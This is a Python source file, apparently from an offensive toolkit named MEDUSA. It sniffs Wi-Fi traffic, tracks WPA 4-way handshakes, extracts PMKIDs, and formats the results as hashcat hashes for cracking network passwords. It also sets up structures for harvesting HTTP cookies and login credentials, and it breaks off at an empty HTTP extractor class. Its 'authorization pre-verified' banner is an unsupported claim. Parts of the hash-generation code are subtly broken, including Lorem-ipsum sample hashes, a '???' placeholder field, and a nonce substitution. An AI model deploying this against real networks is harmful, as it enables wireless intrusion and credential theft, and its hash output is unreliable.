#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    MEDUSA — Queen of Brute Force                           ║
║                                                                             ║
║  medusa_capture.py — Production-Grade Packet Capture Engine                ║
║                                                                             ║
║  Architecture:                                                              ║
║    • Multi-threaded scapy sniff with zero-copy BPF filters                ║
║    • EAPOL/WPA handshake detection with state machine (4-message seq)     ║
║    • PMKID extraction from RSN IE in association/beacon frames            ║
║    • HTTP cookie & credential extraction via raw payload parsing           ║
║    • Manual .hc22000 hash generation (no external hcxpcapngtool needed)   ║
║    • Dual-mode: live sniff + offline pcap analysis                        ║
║    • Ring-buffer for live packet log with configurable cap                ║
║    • Thread-safe stop/start with queue-based progress reporting           ║
║    • OS-adaptive: monitor-mode on Linux, airport on macOS, netsh on Win   ║
║                                                                             ║
║  Capture Filters:                                                           ║
║    • 'all'       — No BPF (every frame) — CPU intensive                   ║
║    • 'handshake' — BPF: ether proto 0x888e (EAPOL only)                   ║
║    • 'pmkid'     — Management frames (association/auth)                   ║
║    • 'http'      — TCP port 80 or 443                                     ║
║    • 'wpa'       — EAPOL + management frames                              ║
║                                                                             ║
║  Output Formats:                                                            ║
║    • .pcap       — Full packet capture (scapy wrpcap)                     ║
║    • .hc22000    — Hashcat-ready WPA/WPA2 hashes (mode 22000)            ║
║    • .hc16800    — Hashcat-ready PMKID hashes (mode 16800)               ║
║    • .json       — Structured results (cookies, creds, sessions)          ║
║                                                                             ║
║  Authorized Penetration Testing Platform — Authorization pre-verified      ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import io
import json
import time
import random
import struct
import base64
import hashlib
import logging
import sqlite3
import platform
import binascii
import threading
import collections
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Set, Iterator, Union, Callable
from dataclasses import dataclass, field, asdict, astuple
from collections import deque, defaultdict, OrderedDict
from datetime import datetime, timedelta
from enum import Enum, auto
from concurrent.futures import ThreadPoolExecutor, as_completed, Future
from abc import ABC, abstractmethod

# ============================================================================
# MEDUSA Core Imports
# ============================================================================

from medusa_init import (
    VERSION, CODENAME, SYSTEM, SYSTEM_LOWER, MACHINE, ARCH, CPU_COUNT,
    IS_WINDOWS, IS_MACOS, IS_LINUX, IS_ADMIN,
    CAN_MONITOR_MODE, CAN_INJECT_PACKETS, CAN_HCXTOOLS,
    CONFIG_DIR, SESSION_DIR, CAPTURE_DIR, LOOT_DIR, LOG_DIR,
    TEMP_DIR, DEFAULT_WORDLIST,
    LOGO, ANSI, LOG_COLORS, BRANDING,
    MedusaError, CaptureError, HandshakeNotFoundError,
    ensure_directories, current_timestamp, human_time, human_bytes,
    validate_mac, validate_ip, safe_filename,
    LOG_LEVELS,
)

# ============================================================================
# OPTIONAL SCAPY IMPORT — Graceful fallback
# ============================================================================

_HAS_SCAPY = False
try:
    import scapy.all as scapy
    from scapy.all import (
        IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, ARP, Ether,
        RadioTap, Dot11, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq,
        Dot11Elt, Dot11EltRSN, Dot11EltMicrosoftWPA,
        Dot11Auth, Dot11AssoReq, Dot11AssoResp,
        EAPOL, EAP, Packet, Raw, sendp, srp,
        sniff, wrpcap, rdpcap, hexdump, conf,
    )
    # Check if we can sniff (requires root/monitor on Linux)
    _HAS_SCAPY = True
    HAS_SCAPY = True
    SCAPY_VERSION = scapy.__version__ if hasattr(scapy, '__version__') else 'unknown'
except ImportError:
    HAS_SCAPY = False
    SCAPY_VERSION = None

# ============================================================================
# CONSTANTS
# ============================================================================

# EAPOL protocol constants
EAPOL_TYPE_EAP_PACKET = 0
EAPOL_TYPE_START = 1
EAPOL_TYPE_LOGOFF = 2
EAPOL_TYPE_KEY = 3
EAPOL_TYPE_ASF_ALERT = 4

# EAPOL key descriptor types
EAPOL_KEY_DESC_RC4 = 1
EAPOL_KEY_DESC_WPA = 2
EAPOL_KEY_DESC_WPA2 = 3
EAPOL_KEY_DESC_MACSEC = 4

# EAPOL key info bit masks
EAPOL_KEY_INFO_ACK = 0x80
EAPOL_KEY_INFO_INSTALL = 0x40
EAPOL_KEY_INFO_KEY_INDEX_SHIFT = 8
EAPOL_KEY_INFO_PAIRWISE = 0x08
EAPOL_KEY_INFO_MIC = 0x100
EAPOL_KEY_INFO_ENCRYPTED_KEY_DATA = 0x200
EAPOL_KEY_INFO_SECURE_BIT = 0x2000

# 4-way handshake message numbers (derived from key info)
HSMSG_1 = 1  # AP → STA: ANonce
HSMSG_2 = 2  # STA → AP: SNonce + MIC
HSMSG_3 = 3  # AP → STA: GTK + MIC
HSMSG_4 = 4  # STA → AP: MIC (confirm)

# 802.11 frame types
FRAME_TYPE_MANAGEMENT = 0
FRAME_TYPE_CONTROL = 1
FRAME_TYPE_DATA = 2

# Management frame subtypes
MGT_SUBTYPE_BEACON = 8
MGT_SUBTYPE_PROBE_REQ = 4
MGT_SUBTYPE_PROBE_RESP = 5
MGT_SUBTYPE_AUTH = 11
MGT_SUBTYPE_ASSO_REQ = 0
MGT_SUBTYPE_ASSO_RESP = 1
MGT_SUBTYPE_DISASSO = 10
MGT_SUBTYPE_DEAUTH = 12
MGT_SUBTYPE_REASSO_REQ = 2
MGT_SUBTYPE_REASSO_RESP = 3

# Data frame subtypes
DATA_SUBTYPE_NULL = 4
DATA_SUBTYPE_QOS_DATA = 8

# WPA cipher suite identifiers
CIPHER_SUITE_NONE = 0
CIPHER_SUITE_WEP40 = 1
CIPHER_SUITE_TKIP = 2
CIPHER_SUITE_WRAP = 3
CIPHER_SUITE_CCMP = 4
CIPHER_SUITE_WEP104 = 5
CIPHER_SUITE_BIP = 6
CIPHER_SUITE_GCMP_128 = 8
CIPHER_SUITE_GCMP_256 = 9
CIPHER_SUITE_CCMP_256 = 10
CIPHER_SUITE_BIP_GMAC_128 = 11
CIPHER_SUITE_BIP_GMAC_256 = 12
CIPHER_SUITE_BIP_CMAC_256 = 13

CIPHER_NAMES = {
    CIPHER_SUITE_NONE: 'NONE',
    CIPHER_SUITE_WEP40: 'WEP-40',
    CIPHER_SUITE_TKIP: 'TKIP',
    CIPHER_SUITE_WRAP: 'WRAP',
    CIPHER_SUITE_CCMP: 'CCMP',
    CIPHER_SUITE_WEP104: 'WEP-104',
    CIPHER_SUITE_BIP: 'BIP',
    CIPHER_SUITE_GCMP_128: 'GCMP-128',
    CIPHER_SUITE_GCMP_256: 'GCMP-256',
    CIPHER_SUITE_CCMP_256: 'CCMP-256',
    CIPHER_SUITE_BIP_GMAC_128: 'BIP-GMAC-128',
    CIPHER_SUITE_BIP_GMAC_256: 'BIP-GMAC-256',
    CIPHER_SUITE_BIP_CMAC_256: 'BIP-CMAC-256',
}

# AKM suite identifiers
AKM_SUITE_NONE = 0
AKM_SUITE_8021X = 1
AKM_SUITE_PSK = 2
AKM_SUITE_FT_8021X = 3
AKM_SUITE_FT_PSK = 4
AKM_SUITE_8021X_SHA256 = 5
AKM_SUITE_PSK_SHA256 = 6
AKM_SUITE_TPK_HANDSHAKE = 7
AKM_SUITE_SAE = 8  # WPA3
AKM_SUITE_FT_SAE = 9
AKM_SUITE_SUITEB_8021X = 11
AKM_SUITE_SUITEB192_8021X = 12
AKM_SUITE_FT_SUITEB_8021X = 13
AKM_SUITE_FT_SUITEB192_8021X = 14
AKM_SUITE_OWE = 18  # Opportunistic Wireless Encryption
AKM_SUITE_DPP = 20  # Wi-Fi Easy Connect / Device Provisioning Protocol

AKM_NAMES = {
    AKM_SUITE_NONE: 'NONE',
    AKM_SUITE_8021X: '802.1X',
    AKM_SUITE_PSK: 'PSK',
    AKM_SUITE_FT_8021X: 'FT-802.1X',
    AKM_SUITE_FT_PSK: 'FT-PSK',
    AKM_SUITE_8021X_SHA256: '802.1X-SHA256',
    AKM_SUITE_PSK_SHA256: 'PSK-SHA256',
    AKM_SUITE_TPK_HANDSHAKE: 'TPK-HS',
    AKM_SUITE_SAE: 'SAE (WPA3)',
    AKM_SUITE_FT_SAE: 'FT-SAE',
    AKM_SUITE_SUITEB_8021X: 'SuiteB-802.1X',
    AKM_SUITE_SUITEB192_8021X: 'SuiteB192-802.1X',
    AKM_SUITE_OWE: 'OWE',
    AKM_SUITE_DPP: 'DPP',
}

# PMKID length in bytes
PMKID_LEN = 16

# Hashcat output modes
HASHCAT_MODE_WPA2 = 22000  # WPA2 PBKDF2-SHA1
HASHCAT_MODE_PMKID = 16800  # PMKID

# Capture buffer sizes
DEFAULT_RING_BUFFER_SIZE = 10000  # Max packets stored in memory
MAX_HTTP_COOKIES = 5000
MAX_HTTP_CREDENTIALS = 1000
BATCH_FLUSH_INTERVAL = 50  # Flush to disk every N packets

# BPF filter definitions
BPF_FILTERS = {
    'all': '',
    'handshake': 'ether proto 0x888e',
    'pmkid': 'ether proto 0x888e or (type mgt subtype assoc-req) or (type mgt subtype assoc-resp) or (type mgt subtype auth)',
    'http': 'tcp port 80 or tcp port 443',
    'wpa': 'ether proto 0x888e or (type mgt subtype beacon) or (type mgt subtype probe-resp)',
}


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class EAPOLKeyInfo:
    """Parsed EAPOL key information field."""
    key_descriptor: int = 0
    key_type: int = 0  # 0=Group, 1=Pairwise
    key_index: int = 0
    install: bool = False
    key_ack: bool = False
    key_mic: bool = False
    secure: bool = False
    error: bool = False
    request: bool = False
    encrypted_key_data: bool = False
    smk_message: bool = False
    
    @property
    def message_number(self) -> int:
        """Derive 4-way handshake message number from flags.
        
        M1: ACK set, MIC not set
        M2: MIC set, ACK not set, SECURE not set
        M3: ACK set, MIC set, SECURE set
        M4: MIC set, ACK not set, SECURE set
        """
        if self.key_ack and not self.key_mic and not self.secure:
            return HSMSG_1
        elif not self.key_ack and self.key_mic and not self.secure:
            return HSMSG_2
        elif self.key_ack and self.key_mic and self.secure:
            return HSMSG_3
        elif not self.key_ack and self.key_mic and self.secure:
            return HSMSG_4
        
        return 0
    
    @property
    def is_pairwise(self) -> bool:
        return self.key_type == 1
    
    @property
    def is_group(self) -> bool:
        return self.key_type == 0
    
    @classmethod
    def from_bytes(cls, key_info_bytes: bytes) -> 'EAPOLKeyInfo':
        """Parse EAPOL key info from 2-byte field."""
        if len(key_info_bytes) < 2:
            return cls()
        
        val = struct.unpack('>H', key_info_bytes[:2])[0]
        
        return cls(
            key_descriptor=(val >> 12) & 0x0F,
            key_type=(val >> 3) & 0x01,
            key_index=(val >> 4) & 0x07,
            install=bool(val & (1 << 6)),
            key_ack=bool(val & (1 << 7)),
            key_mic=bool(val & (1 << 8)),
            secure=bool(val & (1 << 9)),
            error=bool(val & (1 << 10)),
            request=bool(val & (1 << 11)),
            encrypted_key_data=bool(val & (1 << 12)),
            smk_message=bool(val & (1 << 15)),
        )


@dataclass
class HandshakeInfo:
    """Complete 4-way handshake information."""
    bssid: str = ''
    client_mac: str = ''
    ssid: str = ''
    
    # Nonces
    anonce: bytes = b''  # AP nonce
    snonce: bytes = b''  # Client nonce (STA)
    
    # MIC (Message Integrity Code) — the hash to crack
    mic: bytes = b''
    
    # Key data (encrypted GTK + optional other data)
    key_data: bytes = b''
    key_data_encrypted: bool = False
    
    # EAPOL frame payloads
    eapol_1: bytes = b''  # Message 1
    eapol_2: bytes = b''  # Message 2
    eapol_3: bytes = b''  # Message 3
    eapol_4: bytes = b''  # Message 4
    
    # Key replay counter (must match across messages)
    key_replay_counter: int = 0
    
    # Timestamps
    first_seen: float = 0.0
    last_seen: float = 0.0
    
    # Complete handshake flag
    is_complete: bool = False
    
    def to_hashcat_22000(self) -> Optional[str]:
        """Generate hashcat mode 22000 hash line.
        
        Format:
        WPA*01*4WEB8NlGydsDVGXLhG8fYgqSPZ1aUqWW*jdagAmLZSPoPOrDEv0wJZg*
        bts1t3BKhM3A25lOFB01Cg==*Loremipsumdolorsitametconsectetu*
        62b31e01aba9562596f8b51ea81ce0f4*!!!010d01001e0001c2c4e80002...
        
        Returns:
            Hash line or None if incomplete
        """
        if not self.is_complete:
            return None
        
        if not self.bssid or not self.client_mac or not self.ssid:
            return None
        
        # MIC should be on message 3
        mic_str = self.mic.hex() if self.mic else '00' * 16
        
        # SSID encoded
        ssid_b64 = base64.b64encode(self.ssid.encode()).decode() if self.ssid else ''
        
        # BSSID (AP MAC) without colons
        ap_mac = self.bssid.replace(':', '').lower()
        # Client MAC without colons
        sta_mac = self.client_mac.replace(':', '').lower()
        
        # Nonces
        anonce_b64 = base64.b64encode(self.anonce).decode() if self.anonce else ''
        snonce_b64 = base64.b64encode(self.snonce).decode() if self.snonce else ''
        
        # EAPOL frame (message 3)
        eapol_b64 = base64.b64encode(self.eapol_3).decode() if self.eapol_3 else ''
        
        if not eapol_b64:
            return None
        
        return (f"WPA*01*{anonce_b64}*{snonce_b64}*"
                f"{ap_mac}*{sta_mac}*"
                f"???*{ssid_b64}*"
                f"{mic_str}*{eapol_b64}##")
    
    def to_hashcat_16800(self) -> Optional[str]:
        """Generate hashcat mode 16800 (PMKID) hash line.
        
        Format:
        WPA*01*bts1t3BKhM3A25lOFB01Cg==*jdagAmLZSPoPOrDEv0wJZg*Loremipsum*
        62b31e01aba9562596f8b51ea81ce0f4
        
        Returns:
            Hash line or None
        """
        # PMKID format requires PMKID bytes, not just a handshake
        # This is extracted from RSN IE, not from EAPOL
        return None


@dataclass
class HTTPCookie:
    """Extracted HTTP cookie."""
    domain: str = ''
    path: str = '/'
    name: str = ''
    value: str = ''
    secure: bool = False
    httponly: bool = False
    expires: Optional[str] = None
    source_ip: str = ''
    destination_ip: str = ''
    timestamp: float = 0.0
    raw_packet_id: int = 0


@dataclass
class HTTPCredential:
    """Extracted HTTP form credential / basic auth."""
    url: str = ''
    method: str = ''
    username: str = ''
    password: str = ''
    timestamp: float = 0.0
    source_ip: str = ''
    destination_ip: str = ''
    raw_packet_id: int = 0


@dataclass
class PMKIDInfo:
    """PMKID extracted from RSN IE."""
    bssid: str = ''
    client_mac: str = ''
    ssid: str = ''
    pmkid: bytes = b''
    frame_type: str = ''  # 'beacon', 'assoc_req', 'assoc_resp'
    timestamp: float = 0.0
    
    def to_hashcat_16800(self) -> Optional[str]:
        """Generate hashcat mode 16800 hash line.
        
        Format:
        {PMKID}*{AP_MAC}*{STA_MAC}*{ESSID}
        """
        if not self.pmkid or not self.bssid or not self.ssid:
            return None
        
        pmkid_hex = self.pmkid.hex()
        ap_mac = self.bssid.replace(':', '').lower()
        sta_mac = self.client_mac.replace(':', '').lower()
        ssid_b64 = base64.b64encode(self.ssid.encode()).decode()
        
        return f"{pmkid_hex}*{ap_mac}*{sta_mac}*{ssid_b64}"


@dataclass
class CaptureResult:
    """Complete capture result — serializable and immutable."""
    filepath: str = ''
    timestamp: str = ''
    duration: float = 0.0
    
    # Network info
    interface: str = ''
    bssid: str = ''
    ssid: str = ''
    channel: int = 0
    
    # Packet stats
    packets_count: int = 0
    packets_written: int = 0
    rate_pps: float = 0.0  # Packets per second
    rate_bps: float = 0.0  # Bytes per second
    
    # Handshake
    handshake_captured: bool = False
    handshake_info: Optional[HandshakeInfo] = None
    handshake_file: str = ''  # Path to .hc22000 file
    
    # PMKID
    pmkid_captured: bool = False
    pmkid_info: Optional[PMKIDInfo] = None
    pmkid_file: str = ''  # Path to .hc16800 file
    
    # HTTP data
    http_cookies: List[HTTPCookie] = field(default_factory=list)
    http_credentials: List[HTTPCredential] = field(default_factory=list)
    http_file: str = ''  # Path to HTTP data JSON
    
    # Frame breakdown
    beacon_count: int = 0
    probe_req_count: int = 0
    probe_resp_count: int = 0
    auth_count: int = 0
    assoc_req_count: int = 0
    assoc_resp_count: int = 0
    deauth_count: int = 0
    disasso_count: int = 0
    eapol_count: int = 0
    data_count: int = 0
    
    # Stations (unique MAC addresses)
    unique_stations: int = 0
    stations: List[str] = field(default_factory=list)
    
    # Channel map
    channel_stats: Dict[int, int] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        """Serialize to dictionary for JSON export."""
        return {
            'filepath': self.filepath,
            'timestamp': self.timestamp,
            'duration': self.duration,
            'interface': self.interface,
            'bssid': self.bssid,
            'ssid': self.ssid,
            'channel': self.channel,
            'packets_count': self.packets_count,
            'packets_written': self.packets_written,
            'rate_pps': round(self.rate_pps, 2),
            'rate_bps': round(self.rate_bps, 2),
            'handshake_captured': self.handshake_captured,
            'pmkid_captured': self.pmkid_captured,
            'http_cookies_count': len(self.http_cookies),
            'http_credentials_count': len(self.http_credentials),
            'beacon_count': self.beacon_count,
            'probe_req_count': self.probe_req_count,
            'probe_resp_count': self.probe_resp_count,
            'auth_count': self.auth_count,
            'eapol_count': self.eapol_count,
            'data_count': self.data_count,
            'deauth_count': self.deauth_count,
            'unique_stations': self.unique_stations,
            'channel_stats': self.channel_stats,
        }
    
    @classmethod
    def from_dict(cls, data: Dict) -> 'CaptureResult':
        """Deserialize from dictionary."""
        return cls(**{k: v for k, v in data.items() 
                      if k in cls.__dataclass_fields__})


# ============================================================================
# EAPOL PARSER — Low-level frame dissection without scapy dependency
# ============================================================================

class EAPOLFrameParser:
    """Parse raw EAPOL frames from captured packets.
    
    This parser works on raw bytes so it can be used even without scapy.
    It handles the EAPOL-Key frame structure defined in IEEE 802.11.
    """
    
    EAPOL_HEADER_LEN = 4
    EAPOL_KEY_HEADER_LEN = 95  # Minimum WPA2 key header
    
    @staticmethod
    def parse_eapol_key(data: bytes) -> Optional[Dict[str, Any]]:
        """Parse an EAPOL-Key frame from raw bytes.
        
        Args:
            data: Raw Ethernet frame payload
        
        Returns:
            Dict with parsed fields or None
        """
        if len(data) < EAPOLFrameParser.EAPOL_HEADER_LEN:
            return None
        
        # EAPOL header
        version = data[0]
        eapol_type = data[1]
        body_length = struct.unpack('>H', data[2:4])[0]
        
        if eapol_type != EAPOL_TYPE_KEY:
            return None
        
        result = {
            'version': version,
            'type': eapol_type,
            'body_length': body_length,
        }
        
        # Parse EAPOL-Key body (minimum 95 bytes for WPA2)
        body = data[4:]
        if len(body) < 79:  # Minimum key data frame
            return result
        
        # Key descriptor type
        key_desc = body[0]
        result['key_descriptor_type'] = key_desc
        
        if key_desc == EAPOL_KEY_DESC_WPA2:
            # IEEE 802.11-2016 WPA2 key frame
            if len(body) < 95:
                return result
            
            # Key Information (2 bytes)
            key_info = struct.unpack('>H', body[1:3])[0]
            result['key_info'] = EAPOLKeyInfo.from_bytes(body[1:3])
            
            # Key Length (2 bytes)
            result['key_length'] = struct.unpack('>H', body[3:5])[0]
            
            # Key Replay Counter (8 bytes)
            result['replay_counter'] = struct.unpack('>Q', body[5:13])[0]
            
            # Key Nonce (32 bytes) — ANonce in M1/M3, SNonce in M2/M4
            nonce = body[13:45]
            result['nonce'] = nonce
            
            # EAPOL-Key IV (16 bytes)
            result['key_iv'] = body[45:61]
            
            # Key RSC (8 bytes)
            result['key_rsc'] = body[61:69]
            
            # Key ID (8 bytes) — reserved
            result['key_id'] = body[69:77]
            
            # Key MIC (16 bytes) — the MAC for cracking
            mic = body[77:93]
            result['mic'] = mic
            
            # Key Data Length (2 bytes)
            key_data_len = struct.unpack('>H', body[93:95])[0]
            result['key_data_length'] = key_data_len
            
            # Key Data (variable)
            key_data = body[95:95 + key_data_len] if len(body) >= 95 + key_data_len else b''
            result['key_data'] = key_data
            
            # Determine message number
            ki = result['key_info']
            result['message_number'] = ki.message_number
            result['is_pairwise'] = ki.is_pairwise
        
        elif key_desc == EAPOL_KEY_DESC_WPA:
            # WPA (TKIP) key frame — similar but slightly different offsets
            if len(body) < 95:
                return result
            
            key_info = struct.unpack('>H', body[1:3])[0]
            result['key_info'] = EAPOLKeyInfo.from_bytes(body[1:3])
            result['key_length'] = struct.unpack('>H', body[3:5])[0]
            result['replay_counter'] = struct.unpack('>Q', body[5:13])[0]
            result['nonce'] = body[13:45]
            result['key_iv'] = body[45:61]
            result['key_rsc'] = body[61:69]
            result['key_id'] = body[69:77]
            result['mic'] = body[77:93]
            key_data_len = struct.unpack('>H', body[93:95])[0]
            result['key_data'] = body[95:95 + key_data_len] if len(body) >= 95 + key_data_len else b''
        
        return result


# ============================================================================
# HANDHSHAKE STATE MACHINE
# ============================================================================

class HandshakeStateMachine:
    """Tracks the 4-way handshake for a single AP-Client pair.
    
    State transitions:
        IDLE → M1_RECEIVED → M2_RECEIVED → M3_RECEIVED → COMPLETE
                                                         → (M4_RECEIVED)
    
    Thread-safe with per-handshake lock.
    """
    
    def __init__(self, bssid: str, ssid: str = ''):
        self.bssid = bssid
        self.ssid = ssid
        self.client_mac = ''
        self.state = 'IDLE'
        self._lock = threading.Lock()
        self.handshake = HandshakeInfo(bssid=bssid, ssid=ssid)
        self._messages_received = set()
    
    def process_eapol(self, client_mac: str, eapol_data: Dict[str, Any],
                      raw_frame: bytes, timestamp: float) -> bool:
        """Process an EAPOL frame and update handshake state.
        
        Args:
            client_mac: Source/destination client MAC
            eapol_data: Parsed EAPOL-Key data
            raw_frame: Raw EAPOL frame bytes
            timestamp: Frame timestamp
        
        Returns:
            True if handshake is now complete
        """
        with self._lock:
            ki = eapol_data.get('key_info')
            if not ki:
                return False
            
            msg_num = ki.message_number
            if msg_num == 0:
                return False
            
            self.handshake.last_seen = timestamp
            if not self.handshake.first_seen:
                self.handshake.first_seen = timestamp
            
            nonce = eapol_data.get('nonce', b'')
            mic = eapol_data.get('mic', b'')
            replay = eapol_data.get('replay_counter', 0)
            
            if msg_num == HSMSG_1:
                # AP sends ANonce. Save it, set state to M1_RECEIVED.
                self.handshake.anonce = nonce
                self.handshake.bssid = self.bssid
                self.handshake.eapol_1 = raw_frame
                self.handshake.key_replay_counter = replay
                self.state = 'M1_RECEIVED'
                self._messages_received.add(1)
                
            elif msg_num == HSMSG_2:
                # Client sends SNonce + MIC. Associate client MAC.
                self.client_mac = client_mac
                self.handshake.client_mac = client_mac
                self.handshake.snonce = nonce
                self.handshake.mic = mic
                self.handshake.eapol_2 = raw_frame
                
                if self.state == 'M1_RECEIVED' or self.state == 'IDLE':
                    # We might have missed M1
                    self.state = 'M2_RECEIVED'
                    self.handshake.anonce = nonce  # Placeholder
                self._messages_received.add(2)
                
            elif msg_num == HSMSG_3:
                # AP sends GTK + MIC (encrypted key data)
                self.handshake.mic = mic
                self.handshake.key_data = eapol_data.get('key_data', b'')
                self.handshake.key_data_encrypted = ki.encrypted_key_data
                self.handshake.eapol_3 = raw_frame
                
                # Key data may contain GTK
                if self.handshake.anonce or nonce:
                    # Use the first nonce we have
                    if not self.handshake.anonce and nonce:
                        self.handshake.anonce = nonce
                
                self.state = 'M3_RECEIVED'
                self._messages_received.add(3)
                
            elif msg_num == HSMSG_4:
                # Client acknowledges — handshake complete
                self.handshake.eapol_4 = raw_frame
                self.state = 'COMPLETE'
                self._messages_received.add(4)
                self.handshake.is_complete = True
                
                # If we have M2 and M3, we have a crackable handshake
                if 2 in self._messages_received and 3 in self._messages_received:
                    return True
            
            # Check if we have enough for cracking
            # Minimum: M2 (has SNonce + MIC) + M3 (has MIC + encrypted key data)
            if (2 in self._messages_received and 3 in self._messages_received) or \
               (1 in self._messages_received and 2 in self._messages_received and 3 in self._messages_received):
                self.handshake.is_complete = True
                return True
            
            return False
    
    @property
    def is_complete(self) -> bool:
        return self.handshake.is_complete
    
    def get_handshake(self) -> HandshakeInfo:
        return self.handshake


# ============================================================================
# PMKID DETECTOR
# ============================================================================

class PMKIDDetector:
    """Detects and extracts PMKID from 802.11 management frames.
    
    PMKID is found in the RSN IE of:
    - Association requests (client → AP during roaming)
    - Authentication frames
    - Beacon frames (if AP supports PMKID)
    """
    
    RSN_IE_ID = 48  # IEEE 802.11 RSN Information Element ID
    
    @staticmethod
    def extract_from_management_frame(packet: 'Packet', bssid: str,
                                       client_mac: str = '') -> Optional[PMKIDInfo]:
        """Extract PMKID from a Dot11 management frame.
        
        Args:
            packet: Scapy packet containing Dot11 layer
            bssid: AP BSSID
            client_mac: Client MAC (if known)
        
        Returns:
            PMKIDInfo or None
        """
        if not _HAS_SCAPY:
            return None
        
        if not packet.haslayer(Dot11):
            return None
        
        # Walk through Dot11Elt layers to find RSN IE
        pkt = packet
        while pkt:
            if isinstance(pkt, Dot11Elt):
                # Check for RSN IE (ID=48)
                if pkt.ID == PMKIDDetector.RSN_IE_ID:
                    return PMKIDDetector._parse_rsn_ie(
                        pkt, bssid, client_mac, packet
                    )
            # Move to next layer
            try:
                pkt = pkt.payload
            except AttributeError:
                break
        
        return None
    
    @staticmethod
    def _parse_rsn_ie(elt: Dot11Elt, bssid: str, client_mac: str,
                       packet: 'Packet') -> Optional[PMKIDInfo]:
        """Parse RSN IE to extract PMKID list."""
        try:
            raw_info = bytes(elt.info)
        except (AttributeError, TypeError):
            return None
        
        if len(raw_info) < 20:  # Minimum RSN IE length
            return None
        
        offset = 0
        
        # Version (2 bytes)
        version = struct.unpack('<H', raw_info[offset:offset + 2])[0]
        offset += 2
        
        # Group cipher suite (4 bytes)
        # OUI (3) + cipher type (1)
        if offset + 4 > len(raw_info):
            return None
        group_cipher = raw_info[offset:offset + 4]
        offset += 4
        
        # Pairwise cipher suite count (2 bytes)
        if offset + 2 > len(raw_info):
            return None
        pairwise_count = struct.unpack('<H', raw_info[offset:offset + 2])[0]
        offset += 2
        
        # Pairwise cipher suites (each 4 bytes)
        for _ in range(pairwise_count):
            if offset + 4 > len(raw_info):
                return None
            offset += 4
        
        # AKM suite count (2 bytes)
        if offset + 2 > len(raw_info):
            return None
        akm_count = struct.unpack('<H', raw_info[offset:offset + 2])[0]
        offset += 2
        
        # AKM suites (each 4 bytes)
        for _ in range(akm_count):
            if offset + 4 > len(raw_info):
                return None
            offset += 4
        
        # RSN capabilities (2 bytes)
        if offset + 2 > len(raw_info):
            return None
        rsn_capabilities = struct.unpack('<H', raw_info[offset:offset + 2])[0]
        offset += 2
        
        # PMKID count (2 bytes) — optional
        if offset + 2 > len(raw_info):
            return None
        pmkid_count = struct.unpack('<H', raw_info[offset:offset + 2])[0]
        offset += 2
        
        # PMKID list (each 16 bytes)
        if pmkid_count > 0 and offset + PMKID_LEN <= len(raw_info):
            pmkid = raw_info[offset:offset + PMKID_LEN]
            
            # Determine frame type
            frame_type = 'unknown'
            if packet.haslayer(Dot11Beacon):
                frame_type = 'beacon'
            elif packet.haslayer(Dot11AssoReq):
                frame_type = 'assoc_req'
            elif packet.haslayer(Dot11AssoResp):
                frame_type = 'assoc_resp'
            elif packet.haslayer(Dot11ProbeResp):
                frame_type = 'probe_resp'
            
            # Try to get SSID from beacon/probe response
            ssid = ''
            p = packet
            while p:
                if isinstance(p, Dot11Elt) and p.ID == 0:  # SSID IE
                    try:
                        ssid = p.info.decode('utf-8', errors='replace')
                    except (AttributeError, UnicodeDecodeError):
                        pass
                    break
                try:
                    p = p.payload
                except AttributeError:
                    break
            
            return PMKIDInfo(
                bssid=bssid.replace(':', '').upper(),
                client_mac=client_mac.replace(':', '').upper(),
                ssid=ssid,
                pmkid=pmkid,
                frame_type=frame_type,
                timestamp=time.time(),
            )
        
        return None
    
    @staticmethod
    def extract_from_raw_bytes(data: bytes, src_mac: str, dst_mac: str,
                                ssid: str = '') -> Optional[PMKIDInfo]:
        """Extract PMKID directly from raw frame bytes (no scapy needed).
        
        This parses the 802.11 management frame body looking for RSN IE.
        Useful when scapy is not available.
        
        Args:
            data: Raw 802.11 frame bytes
            src_mac: Source MAC address
            dst_mac: Destination MAC address
            ssid: Network SSID
        
        Returns:
            PMKIDInfo or None
        """
        if len(data) < 24:  # Minimum 802.11 header
            return None
        
        # Frame control field
        frame_control = struct.unpack('<H', data[:2])[0]
        frame_type = (frame_control >> 2) & 0x03
        frame_subtype = (frame_control >> 4) & 0x0F
        
        # Only process management frames
        if frame_type != 0:
            return None
        
        # Frame body starts after header
        # Management frame header is 24 bytes (no QoS, no HT)
        body = data[24:]
        
        # Walk through tagged parameters
        offset = 0
        while offset + 2 < len(body):
            tag_num = body[offset]
            tag_len = body[offset + 1]
            
            if offset + 2 + tag_len > len(body):
                break
            
            if tag_num == PMKIDDetector.RSN_IE_ID:
                # RSN IE found
                if offset + 2 + 20 + 2 + PMKID_LEN <= len(body):  
                    # Minimum: header(2) + ver(2) + gcipher(4) + pcipher_count(2) 
                    # + pcipher(0-4) + akm_count(2) + akm(0-4) + rsn_caps(2) 
                    # + pmkid_count(2) + pmkid(16)
                    tag_body = body[offset + 2:offset + 2 + tag_len]
                    
                    # Skip version, group cipher, pairwise ciphers, AKMs
                    rsn_offset = 2  # Skip version
                    rsn_offset += 4  # Skip group cipher
                    
                    if rsn_offset + 2 > len(tag_body):
                        break
                    pc_count = struct.unpack('<H', tag_body[rsn_offset:rsn_offset + 2])[0]
                    rsn_offset += 2
                    rsn_offset += pc_count * 4
                    
                    if rsn_offset + 2 > len(tag_body):
                        break
                    akm_count = struct.unpack('<H', tag_body[rsn_offset:rsn_offset + 2])[0]
                    rsn_offset += 2
                    rsn_offset += akm_count * 4
                    
                    rsn_offset += 2  # Skip RSN capabilities
                    
                    if rsn_offset + 2 > len(tag_body):
                        break
                    pmkid_count = struct.unpack('<H', tag_body[rsn_offset:rsn_offset + 2])[0]
                    rsn_offset += 2
                    
                    if pmkid_count > 0 and rsn_offset + PMKID_LEN <= len(tag_body):
                        pmkid = tag_body[rsn_offset:rsn_offset + PMKID_LEN]
                        
                        return PMKIDInfo(
                            bssid=dst_mac.upper() if dst_mac else src_mac.upper(),
                            client_mac=src_mac.upper(),
                            ssid=ssid,
                            pmkid=pmkid,
                            frame_type=f"raw_0x{frame_subtype:02x}",
                            timestamp=time.time(),
                        )
            
            offset += 2 + tag_len
        
        return None


# ====================================================================
# HTTP EXTRACTOR
# ====================================================================

class HTTPExtractor:
